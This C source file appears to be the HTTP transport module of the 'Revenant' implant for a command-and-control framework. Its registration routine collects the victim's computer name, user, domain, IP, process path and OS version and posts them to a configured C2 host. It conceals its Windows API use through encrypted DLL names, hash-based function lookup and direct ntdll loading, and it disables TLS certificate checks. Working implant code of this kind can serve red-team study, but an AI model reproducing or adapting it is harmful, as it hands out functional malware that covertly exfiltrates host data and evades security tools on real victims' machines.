#include "Defs.h"
#include "Core.h"
#include "Poly.h"
#include "Config.h"
#include "Command.h"
#include "Revenant.h"
#include "Transport.h"
#include "Utilities.h"
#include "Obfuscation.h"
#include "Dbg.h"

#include <iptypes.h>
#include <iphlpapi.h>
#include <winhttp.h>

#define DATA_FREE( d, l ) \
    mem_set( d, 0, l ); \
    LocalFree( d ); \
    d = NULL;

BOOL TransportInit( ) {
    PPACKAGE         Package    = NULL;
    BOOL             Success    = FALSE;
    PVOID            Data       = NULL;
    PIP_ADAPTER_INFO Adapter    = NULL;
    OSVERSIONINFOEXW OsVersions = { 0 };
    SIZE_T           Length     = 0;

    Package = PackageCreate( COMMAND_REGISTER );

    // Add data
    /*
        [ SIZE         ] 4 bytes
        [ Magic Value  ] 4 bytes
        [ Agent ID     ] 4 bytes
        [ COMMAND ID   ] 4 bytes

        [ Demon ID     ] 4 bytes
        [ User Name    ] size + bytes
        [ Host Name    ] size + bytes
        [ Domain       ] size + bytes
        [ IP Address   ] 16 bytes?
        [ Process Name ] size + bytes
        [ Process ID   ] 4 bytes
        [ Parent  PID  ] 4 bytes
        [ Process Arch ] 4 bytes
        [ Elevated     ] 4 bytes
        [ OS Info      ] ( 5 * 4 ) bytes
        [ OS Arch      ] 4 bytes
    */

    // Add AES Keys/IV
    // PackageAddPad( Package, Instance.Config.AES.Key, 32 );
    // PackageAddPad( Package, Instance.Config.AES.IV,  16 );

    // Add session id
    PackageAddInt32( Package, Instance.Session.AgentID );
    PWCHAR pwcAdvapi32 = NULL;
    PWCHAR pwcIphlpapi = NULL;

#if CONFIG_OBFUSCATION == TRUE
    // Get Computer name
    UCHAR s_kernel32[] = S_KERNEL32;
    UCHAR s_advapi32[] = S_ADVAPI32;
    UCHAR s_iphlpapi[] = S_IPHLPAPI;

    UCHAR s_xkey[] = S_XK;

    UCHAR d_kernel32[14] = {0};
    UCHAR d_advapi32[14] = {0};
    UCHAR d_iphlpapi[14] = {0};

    ROL_AND_DECRYPT((CONST CHAR *)s_kernel32, sizeof(s_kernel32), 1, d_kernel32, (CONST CHAR *)s_xkey);
    ROL_AND_DECRYPT((CONST CHAR *)s_advapi32, sizeof(s_advapi32), 1, d_advapi32, (CONST CHAR *)s_xkey);
    ROL_AND_DECRYPT((CONST CHAR *)s_iphlpapi, sizeof(s_iphlpapi), 1, d_iphlpapi, (CONST CHAR *)s_xkey);

    HANDLE p_kernel32 = LocalGetModuleHandle(d_kernel32);

#if CONFIG_NATIVE == TRUE

#if CONFIG_ARCH == 64
    VOID *p_ntdll = get_ntdll_64();
#else
    VOID *p_ntdll = get_ntdll_32();
#endif //CONFIG_ARCH
    NTSTATUS status;
    UNICODE_STRING usAdvapi32;
    UNICODE_STRING usIphlpapi;

    pwcAdvapi32 = str_to_wide(d_advapi32);
    pwcIphlpapi = str_to_wide(d_iphlpapi);

    LdrLoadDll_t p_LdrLoadDll = GetProcAddressByHash(p_ntdll, LdrLoadDll_CRC32B);
    RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);

    p_RtlInitUnicodeString(&usAdvapi32, pwcAdvapi32);
    p_RtlInitUnicodeString(&usIphlpapi, pwcIphlpapi);

    PVOID p_advapi32 = NULL;
    PVOID p_iphlpapi = NULL;

    check_debug(p_LdrLoadDll(NULL, NULL, &usAdvapi32, &p_advapi32) == 0 , "LdrLoadDll advapi32 Failed!");
    check_debug(p_LdrLoadDll(NULL, NULL, &usIphlpapi, &p_iphlpapi) == 0 , "LdrLoadDll iphlpapi Failed!");

#else
    HANDLE p_advapi32 = LoadLibrary(d_advapi32);
    HANDLE p_iphlpapi = LoadLibrary(d_iphlpapi);
#endif

    GetComputerNameExA_t p_GetComputerNameExA = (GetComputerNameExA_t) GetProcAddressByHash(p_kernel32,
                                                                                            GetComputerNameExA_CRC32B);
    if ( ! p_GetComputerNameExA(ComputerNameNetBIOS, NULL, (LPDWORD) &Length) ) {
        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
            check_debug(p_GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length) != 0, "GetComputerNameExA Failed!");
    }

    PackageAddBytes( Package, Data, Length );
    DATA_FREE( Data, Length );

    // Get Username
    GetUserNameA_t p_GetUserNameA = (GetUserNameA_t) GetProcAddressByHash(p_advapi32, GetUserNameA_CRC32B);

    Length = MAX_PATH;
    if ( ( Data = LocalAlloc( LPTR, Length ) ) ) {
        check_debug(p_GetUserNameA(Data, (LPDWORD) &Length) != 0, "GetUserNameA Failed!");
    }

    PackageAddBytes( Package, Data, str_len( Data ) );
    DATA_FREE( Data, Length );

    // Get Domain
    if ( ! p_GetComputerNameExA(ComputerNameDnsDomain, NULL, (LPDWORD) &Length) ) {
        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
            check_debug(p_GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length) != 0, "GetComputerNameExA Failed!");
    }
    PackageAddBytes( Package, Data, Length );
    DATA_FREE( Data, Length );

    GetAdaptersInfo_t p_GetAdaptersInfo = (GetAdaptersInfo_t) GetProcAddressByHash(p_iphlpapi, GetAdaptersInfo_CRC32B);

    check_debug(p_GetAdaptersInfo(NULL, (PULONG) &Length) != 0, "GetAdaptersInfo Failed!");

    if ( ( Adapter = LocalAlloc( LPTR, Length ) ) ) {
        if (p_GetAdaptersInfo(Adapter, (PULONG) &Length) == NO_ERROR ){
            PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, str_len( Adapter->IpAddressList.IpAddress.String ) );

            mem_set( Adapter, 0, Length );
            LocalFree( Adapter );
            Adapter = NULL;
        }
        else
            PackageAddInt32( Package, 0 );
    }
    else {
        PackageAddInt32(Package, 0);
    }

    GetModuleFileNameA_t p_GetModuleFileNameA = (GetModuleFileNameA_t) GetProcAddressByHash(p_kernel32,
                                                                                            GetModuleFileNameA_CRC32B);

    Length = MAX_PATH;
    if ( ( Data = LocalAlloc( LPTR, Length ) ) )
    {
        Length = p_GetModuleFileNameA( NULL, Data, Length );
        PackageAddBytes( Package, Data, Length );
    } else {
        PackageAddInt32( Package, 0 );
    }

    GetCurrentProcessId_t p_GetCurrentProcessId = (GetCurrentProcessId_t) GetProcAddressByHash(p_kernel32,
                                                                                               GetCurrentProcessId_CRC32B);
    PackageAddInt32( Package, p_GetCurrentProcessId() );

    FreeLibrary(p_advapi32);
    FreeLibrary(p_iphlpapi);

#else

    // Get Computer name
    if ( ! GetComputerNameExA(ComputerNameNetBIOS, NULL, (LPDWORD) &Length) ) {
        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
            check_debug(GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length) != 0,
                        "GetComputerNameExA") ;
    }

    PackageAddBytes( Package, Data, Length );
    DATA_FREE( Data, Length );

    // Get Username
    Length = MAX_PATH;
    if ( ( Data = LocalAlloc( LPTR, Length ) ) ) {
        check_debug(GetUserNameA(Data, (LPDWORD) &Length) !=0, "GetUserNameA Failed!");
    }

    PackageAddBytes( Package, Data, str_len( Data ) );
    DATA_FREE( Data, Length );

    // Get Domain
    if ( ! GetComputerNameExA(ComputerNameDnsDomain, NULL, (LPDWORD) &Length) ) {
        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
            check_debug(GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length) != 0,
                        "GetComputerNameExA Failed!");
    }
    PackageAddBytes( Package, Data, Length );
    DATA_FREE( Data, Length );

    GetAdaptersInfo(NULL, (PULONG) &Length);
    if ( ( Adapter = LocalAlloc( LPTR, Length ) ) ) {
        if (GetAdaptersInfo(Adapter, (PULONG) &Length) == NO_ERROR ){
            PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, str_len( Adapter->IpAddressList.IpAddress.String ) );

            mem_set( Adapter, 0, Length );
            LocalFree( Adapter );
            Adapter = NULL;
        }
        else
            PackageAddInt32( Package, 0 );
    }
    else {
        PackageAddInt32(Package, 0);
    }
    Length = MAX_PATH;
    if ( ( Data = LocalAlloc( LPTR, Length ) ) )
    {
        Length = GetModuleFileNameA( NULL, Data, Length );
        PackageAddBytes( Package, Data, Length );
    } else {
        PackageAddInt32( Package, 0 );
    }

    PackageAddInt32( Package, GetCurrentProcessId() );
#endif


    PackageAddInt32( Package, (DWORD) 0 ); // PPID
    PackageAddInt32( Package, Instance.Session.ProcArch );
    PackageAddInt32( Package, FALSE ); // isAdmin

    mem_set( &OsVersions, 0, sizeof( OsVersions ) );
    OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
    Instance.Win32.RtlGetVersion( &OsVersions );

    PackageAddInt32( Package, OsVersions.dwMajorVersion );
    PackageAddInt32( Package, OsVersions.dwMinorVersion );
    PackageAddInt32( Package, OsVersions.wProductType );
    PackageAddInt32( Package, OsVersions.wServicePackMajor );
    PackageAddInt32( Package, OsVersions.dwBuildNumber );

    PackageAddInt32( Package, Instance.Session.OSArch );
    PackageAddInt32( Package, Instance.Config.Sleeping );
    PackageAddInt32( Package, Instance.Config.Jitter );
    PackageAddInt32( Package, Instance.Config.Transport.KillDate );
    PackageAddInt32( Package, Instance.Config.Transport.WorkingHours );
    // End of Options

    if ( PackageTransmit( Package, &Data, &Length ) ){
        // PRINT_HEX( Data, (int)Length )

        if ( Data ){
            // _tprintf( "Agent => %x : %x\n", ( UINT32 ) DEREF( Data ), ( UINT32 ) Instance.Session.AgentID );
            if ( ( UINT32 ) Instance.Session.AgentID == ( UINT32 ) DEREF( Data ) ){
                Instance.Session.Connected = TRUE;
                Success = TRUE;
            }
        }
        else {
            Success = FALSE;
        }
    }
    LEAVE:

    if(Data != NULL){
        DATA_FREE(Data, Length)
    }

#if CONFIG_OBFUSCATION == TRUE

    if(pwcAdvapi32 != NULL){
        INT lenWAdvapi32 = lstrlenW(pwcAdvapi32);
        DATA_FREE(pwcAdvapi32,lenWAdvapi32)
    }

    if(pwcIphlpapi != NULL){
        INT lenWIphlpapi = lstrlenW(pwcIphlpapi);
        DATA_FREE(pwcIphlpapi,lenWIphlpapi)
    }

    // zero out decrypted strings
    mem_set(d_kernel32,0x0,str_len(s_kernel32));
    mem_set(d_advapi32,0x0,str_len(s_advapi32));
    mem_set(d_iphlpapi,0x0,str_len(s_iphlpapi));
#endif
    return Success;
}

BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize ) {
    HANDLE  hConnect        = NULL;
    HANDLE  hSession        = NULL;
    HANDLE  hRequest        = NULL;

    LPWSTR  HttpEndpoint    = NULL;
    DWORD   HttpFlags       = 0;
    DWORD   HttpAccessType  = 0;
    LPCWSTR HttpProxy       = NULL;
    DWORD   BufRead         = 0;
    UCHAR   Buffer[ 1024 ]  = { 0 };
    PVOID   RespBuffer      = NULL;
    SIZE_T  RespSize        = 0;
    BOOL    Successful      = FALSE;

#if CONFIG_OBFUSCATION == TRUE
    unsigned char s_xk[] = S_XK;
    unsigned char s_string[] = S_WINHTTP;
    unsigned char winhttp[sizeof(s_string)] = { 0 };

    ROL_AND_DECRYPT((char *)s_string, sizeof(s_string), 1, winhttp, s_xk);


    //winhttp[11] = 0x00;

    WinHttpOpen_t p_WinHttpOpen  = (WinHttpOpen_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp), WinHttpOpen_CRC32B);
    hSession = p_WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );

#else
    hSession = WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
#endif
    check_debug(hSession != NULL, "WinHttpOpen Failed!");

#if CONFIG_OBFUSCATION == TRUE
    WinHttpConnect_t p_WinHttpConnect  = (WinHttpConnect_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
                                                                                WinHttpConnect_CRC32B);
    hConnect = p_WinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
    WinHttpCloseHandle_t p_WinHttpCloseHandle = NULL;
#else
    hConnect = WinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
#endif

    check_debug(hConnect != NULL, "WinHttpConnect Failed!");

    HttpEndpoint = L"index.php";
    HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

    if ( Instance.Config.Transport.Secure ) {
        HttpFlags |= WINHTTP_FLAG_SECURE;
    }

#if CONFIG_OBFUSCATION == TRUE
    WinHttpOpenRequest_t p_WinHttpOpenRequest  = (WinHttpOpenRequest_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
                                                                                            WinHttpOpenRequest_CRC32B);
    hRequest = p_WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );


#else
    hRequest = WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
#endif

    check_debug(hRequest != NULL, "WinHttpOpenRequest Failed!");

    if ( Instance.Config.Transport.Secure )
    {
        HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        check_debug(WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) == TRUE, "WinHttpSetOption Failed!");

    }




#if CONFIG_OBFUSCATION == TRUE
    WinHttpSendRequest_t pWinHttpSendRequest  = (WinHttpSendRequest_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
                                                                                            WinHttpSendRequest_CRC32B);
    // Send our data
    if ( pWinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, NULL ) )
    {
#else
    // Send our data
    if ( WinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, NULL ) )
    {
#endif

#if CONFIG_OBFUSCATION == TRUE
        WinHttpReceiveResponse_t pWinHttpReceiveResponse  = (WinHttpReceiveResponse_t) GetProcAddressByHash(
                LocalGetModuleHandle(winhttp), WinHttpReceiveResponse_CRC32B);
        if ( RecvData && pWinHttpReceiveResponse( hRequest, NULL ) )
        {
#else
            if ( RecvData && WinHttpReceiveResponse( hRequest, NULL ) )
        {
#endif
            RespBuffer = NULL;
            do
            {
#if CONFIG_OBFUSCATION == TRUE
                WinHttpReadData_t p_WinHttpReadData  = (WinHttpReadData_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
                                                                                               WinHttpReadData_CRC32B);
                Successful = p_WinHttpReadData( hRequest, Buffer, 1024, &BufRead );

#else
                Successful = WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
#endif

                if ( ! Successful || BufRead == 0 )
                {
                    check_debug(Successful, "WinHttpReadData Failed!");
                    break;
                }

                if ( ! RespBuffer ) {
                    RespBuffer = LocalAlloc(LPTR, BufRead);
                }else {
                    RespBuffer = LocalReAlloc(RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT);
                }
                RespSize += BufRead;

                mem_cpy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
                mem_set( Buffer, 0, 1024 );

            } while ( Successful == TRUE );

            if ( RecvSize ) {
                *RecvSize = RespSize;
            }

            if ( RecvData ) {
                *RecvData = RespBuffer;
            }
            Successful = TRUE;
        }
    }
    else
    {
        if ( GetLastError() == 12029 ) { // ERROR_INTERNET_CANNOT_CONNECT
            Instance.Session.Connected = FALSE;
        }
        else {
            // _tprintf( "WinHttpSendRequest: Failed => %d\n", GetLastError() );
        }
        Successful = FALSE;
        goto LEAVE;
    }


    LEAVE:

#if CONFIG_OBFUSCATION == TRUE

    p_WinHttpCloseHandle = (WinHttpCloseHandle_t) GetProcAddressByHash(LocalGetModuleHandle(winhttp),
                                                                      WinHttpCloseHandle_CRC32B);
    mem_set(winhttp,0x0,str_len(s_string));
    p_WinHttpCloseHandle ( hSession );
    p_WinHttpCloseHandle ( hConnect );
    p_WinHttpCloseHandle ( hRequest );

#else
    WinHttpCloseHandle( hSession );
    WinHttpCloseHandle( hConnect );
    WinHttpCloseHandle( hRequest );
#endif

    return Successful;
}